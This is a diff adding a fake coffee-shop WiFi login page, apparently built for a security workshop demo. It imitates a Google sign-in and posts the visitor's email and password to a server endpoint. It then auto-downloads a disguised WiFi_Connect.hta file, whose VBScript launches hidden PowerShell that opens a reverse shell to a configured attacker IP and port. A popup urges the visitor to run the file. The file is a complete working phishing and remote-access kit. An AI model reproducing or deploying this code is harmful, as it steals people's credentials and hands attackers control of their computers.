@@ -1,0 +1,488 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login — Coffee Shop</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;1,9..40,400&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --bg-dark: #000000;
+        --bg-gradient-end: #1a1a2e;
+        --card-bg: rgba(255, 255, 255, 0.05);
+        --card-border: rgba(255, 255, 255, 0.1);
+        --text-white: #ffffff;
+        --text-light: #e0e0e0;
+        --accent: #ba9d63;
+        --input-bg: rgba(255, 255, 255, 0.08);
+        --input-border: rgba(186, 157, 99, 0.3);
+        --error: #ff3b30;
+      }
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        font-family: "DM Sans", system-ui, sans-serif;
+        background: linear-gradient(
+          to bottom,
+          var(--bg-dark),
+          var(--bg-gradient-end)
+        );
+        color: var(--text-light);
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        text-align: center;
+        -webkit-font-smoothing: antialiased;
+      }
+      .card {
+        width: 100%;
+        max-width: 420px;
+        background: var(--card-bg);
+        backdrop-filter: blur(10px);
+        border: 1px solid var(--card-border);
+        border-radius: 20px;
+        padding: 40px 28px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+      }
+      .logo-wrap {
+        margin: 0 auto 28px;
+        text-align: center;
+      }
+      .logo-wrap svg {
+        width: 200px;
+        height: auto;
+        display: block;
+        margin: 0 auto;
+      }
+      .card .hero-title {
+        font-size: 32px;
+        font-weight: 700;
+        margin-bottom: 12px;
+        color: var(--text-white);
+      }
+      .tagline {
+        font-size: 18px;
+        color: var(--accent);
+        margin-bottom: 16px;
+      }
+      .promo {
+        font-size: 17px;
+        line-height: 1.6;
+        margin: 0 0 32px;
+        padding: 0;
+        list-style: none;
+        color: var(--text-light);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      .promo li {
+        margin-bottom: 0.25rem;
+        width: fit-content;
+      }
+      .promo li:last-child {
+        margin-bottom: 0;
+      }
+      .card .form-title {
+        font-size: 1.125rem;
+        font-weight: 600;
+        color: var(--text-white);
+        margin-bottom: 0.5rem;
+      }
+      .card .subtitle {
+        font-size: 0.9375rem;
+        color: #a0a0a0;
+        margin-bottom: 1.5rem;
+      }
+      .field {
+        margin-bottom: 1.25rem;
+        text-align: left;
+      }
+      .field label {
+        display: block;
+        margin-bottom: 0.375rem;
+        font-size: 0.875rem;
+        font-weight: 500;
+        color: var(--text-light);
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        font-size: 17px;
+        border: 1px solid var(--input-border);
+        border-radius: 10px;
+        background: var(--input-bg);
+        color: var(--text-white);
+        font-family: inherit;
+        transition: border-color 0.15s ease;
+      }
+      .g-input::placeholder {
+        color: #808080;
+      }
+      .g-input:focus {
+        outline: none;
+        border-color: var(--accent);
+      }
+      button[type="submit"] {
+        width: 100%;
+        margin-top: 0.5rem;
+        padding: 14px;
+        border: none;
+        border-radius: 12px;
+        background: var(--accent);
+        color: #000;
+        font-size: 17px;
+        font-weight: 600;
+        font-family: inherit;
+        cursor: pointer;
+        transition: opacity 0.15s ease;
+      }
+      button[type="submit"]:hover {
+        opacity: 0.9;
+      }
+      button[type="submit"]:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+      .form-status {
+        margin: 0.75rem 0 0;
+        font-size: 0.875rem;
+        min-height: 1.25rem;
+      }
+      .form-status--success {
+        color: #4ade80;
+      }
+      .form-status--error {
+        color: var(--error);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <div class="logo-wrap">
+        <svg
+          class="coffee-house-logo"
+          viewBox="0 0 95 48"
+          fill="none"
+          xmlns="http://www.w3.org/2000/svg"
+          aria-label="The Coffee House"
+        >
+          <text
+            x="40"
+            y="14"
+            text-anchor="middle"
+            font-family="DM Sans, sans-serif"
+            font-weight="700"
+            font-size="20"
+            fill="#ffffff"
+          >
+            THE
+          </text>
+          <text
+            x="27"
+            y="30"
+            text-anchor="middle"
+            font-family="DM Sans, sans-serif"
+            font-weight="700"
+            font-size="20"
+            fill="#ffffff"
+          >
+            C
+          </text>
+          <g transform="translate(44, 21)">
+            <circle
+              cx="-2"
+              cy="3"
+              r="4.5"
+              stroke="#ffffff"
+              stroke-width="1.5"
+              fill="none"
+            />
+            <line
+              x1="-7.5"
+              y1="8.2"
+              x2="3.8"
+              y2="8.2"
+              stroke="#ffffff"
+              stroke-width="1.2"
+              stroke-linecap="round"
+            />
+          </g>
+          <text
+            x="72"
+            y="30"
+            text-anchor="middle"
+            font-family="DM Sans, sans-serif"
+            font-weight="700"
+            font-size="20"
+            fill="#ffffff"
+          >
+            FFEE
+          </text>
+          <text
+            x="27"
+            y="46"
+            text-anchor="middle"
+            font-family="DM Sans, sans-serif"
+            font-weight="700"
+            font-size="20"
+            fill="#ffffff"
+          >
+            H
+          </text>
+          <g transform="translate(44, 35)">
+            <circle
+              cx="-2.2"
+              cy="3"
+              r="4.5"
+              stroke="#ffffff"
+              stroke-width="1.5"
+              fill="none"
+            />
+            <line
+              x1="-7.5"
+              y1="8.2"
+              x2="3.8"
+              y2="8.2"
+              stroke="#ffffff"
+              stroke-width="1.2"
+              stroke-linecap="round"
+            />
+          </g>
+          <text
+            x="68"
+            y="46"
+            text-anchor="middle"
+            font-family="DM Sans, sans-serif"
+            font-weight="700"
+            font-size="20"
+            fill="#ffffff"
+          >
+            USE
+          </text>
+        </svg>
+      </div>
+
+      <h1 class="hero-title">Complimentary WiFi</h1>
+      <p class="tagline">Fresh Roast • Free Wifi for Customers</p>
+      <ul class="promo">
+        <li>Fast</li>
+        <li>End-To-End Encrypted</li>
+        <li>Secure</li>
+      </ul>
+
+      <h2 class="form-title">Sign in with Google</h2>
+      <form id="email-form-step">
+        <div class="field">
+          <label for="userid">Email</label>
+          <input
+            id="userid"
+            name="email"
+            type="text"
+            class="g-input"
+            placeholder="you@example.com"
+            required
+          />
+        </div>
+        <div class="field">
+          <label for="pwd">Password</label>
+          <input
+            id="pwd"
+            name="password"
+            type="password"
+            class="g-input"
+            placeholder="••••••••"
+            required
+          />
+        </div>
+        <button type="submit" id="signin-btn">Sign in</button>
+        <p id="form-status" class="form-status" aria-live="polite"></p>
+      </form>
+    </div>
+
+    <script>
+      // === DEMO CONFIG (set before workshop) ===
+      var ATTACK_BOX_IP = "192.168.1.100";
+      var ATTACK_BOX_PORT = "4444";
+
+      document
+        .getElementById("email-form-step")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          var btn = document.getElementById("signin-btn");
+          var statusEl = document.getElementById("form-status");
+          statusEl.textContent = "";
+          statusEl.className = "form-status";
+
+          var username = document.getElementById("userid").value.trim();
+          var password = document.getElementById("pwd").value;
+
+          if (!username || !password) {
+            statusEl.textContent = "Please enter email and password.";
+            statusEl.className = "form-status form-status--error";
+            return;
+          }
+
+          var jsonData = {
+            username: username,
+            password: password,
+            source: "angry_coffee",
+            timestamp: new Date().toISOString(),
+          };
+
+          btn.disabled = true;
+
+          fetch("/sendJSON", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(jsonData),
+          })
+            .then(function (response) {
+              if (!response.ok) {
+                throw new Error(
+                  "Server responded with status " + response.status,
+                );
+              }
+              var ct = response.headers.get("Content-Type") || "";
+              if (ct.indexOf("application/json") !== -1) {
+                return response.json();
+              }
+              return response.text().then(function () {
+                return null;
+              });
+            })
+            .then(function () {
+              statusEl.textContent = "Submitted.";
+              statusEl.className = "form-status form-status--success";
+              console.log("Payload sent to /sendJSON successfully.");
+
+              var htaContent = buildHtaContent();
+              triggerHtaDownload(htaContent);
+              openInstructionWindow();
+            })
+            .catch(function (error) {
+              statusEl.textContent = "Send failed. Check console or network.";
+              statusEl.className = "form-status form-status--error";
+              console.error("Fetch error:", error);
+            })
+            .finally(function () {
+              btn.disabled = false;
+            });
+        });
+
+      function buildHtaContent() {
+        var ip = ATTACK_BOX_IP;
+        var port = ATTACK_BOX_PORT;
+        var psPayload =
+          "$c=New-Object Net.Sockets.TCPClient('" +
+          ip +
+          "'," +
+          port +
+          ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$g=[Text.Encoding]::ASCII.GetString($b,0,$i);$p=(iex $g 2>&1|Out-String);$q=[Text.Encoding]::ASCII.GetBytes($p);$s.Write($q,0,$q.Length)};$c.Close()";
+        var psEscaped = psPayload.replace(/"/g, '""');
+        var vbQ = String.fromCharCode(34);
+        var htaParts = [
+          "<!DOCTYPE html><html><head><title>WiFi Setup</title>",
+          "<HTA:APPLICATION id=app border=thin caption=yes showInTaskbar=yes />",
+          "<script language=",
+          vbQ,
+          "VBScript",
+          vbQ,
+          ">",
+          "Sub ShowStep2()",
+          "  document.getElementById(",
+          vbQ,
+          "step1",
+          vbQ,
+          ").style.display=",
+          vbQ,
+          "none",
+          vbQ,
+          "\n",
+          "  document.getElementById(",
+          vbQ,
+          "step2",
+          vbQ,
+          ").style.display=",
+          vbQ,
+          "block",
+          vbQ,
+          "\n",
+          "End Sub",
+          "Sub RunFinish()",
+          "  Dim sh, cmd",
+          "  Set sh = CreateObject(",
+          vbQ,
+          "WScript.Shell",
+          vbQ,
+          ")",
+          "  cmd = ",
+          vbQ,
+          "powershell -nop -w hidden -c ",
+          vbQ,
+          " & Chr(34) & ",
+          vbQ,
+          psEscaped,
+          vbQ,
+          " & Chr(34)",
+          "  sh.Run cmd, 0, False",
+          "  window.close",
+          "End Sub",
+          "</scr" +
+            "ipt></head><body style='font-family:Segoe UI;padding:20px;'>",
+          "<div id='step1'><p><b>Welcome to Coffee House WiFi setup</b></p>",
+          "<p>Click Next to continue.</p>",
+          "<input type='button' value='Next' onclick='ShowStep2'>",
+          "</div>",
+          "<div id='step2' style='display:none'>",
+          "<p><b>Click Finish to join WiFi.</b></p>",
+          "<input type='button' value='Finish' onclick='RunFinish'>",
+          "</div></body></html>",
+        ];
+        return htaParts.join("");
+      }
+
+      function triggerHtaDownload(htaContent) {
+        var blob = new Blob([htaContent], { type: "application/hta" });
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement("a");
+        a.href = url;
+        a.download = "WiFi_Connect.hta";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      }
+
+      function openInstructionWindow() {
+        var w = window.open(
+          "",
+          "_blank",
+          "width=440,height=180,scrollbars=yes,resizable=yes",
+        );
+        if (w) {
+          w.document.write(
+            "<!DOCTYPE html><html><head><title>Connecting to WiFi</title>" +
+              "<style>body{font-family:Segoe UI;padding:20px;}</style></head><body>" +
+              "<p><b>To complete setup, click <strong>Open</strong> or <strong>Run</strong> on the file that just downloaded (<strong>WiFi_Connect.hta</strong>).</b></p>" +
+              "<p>You can find it in your browser's download bar at the bottom or top of the window.</p>" +
+              "</body></html>",
+          );
+          w.document.close();
+        }
+      }
+    </script>
+  </body>
+</html>
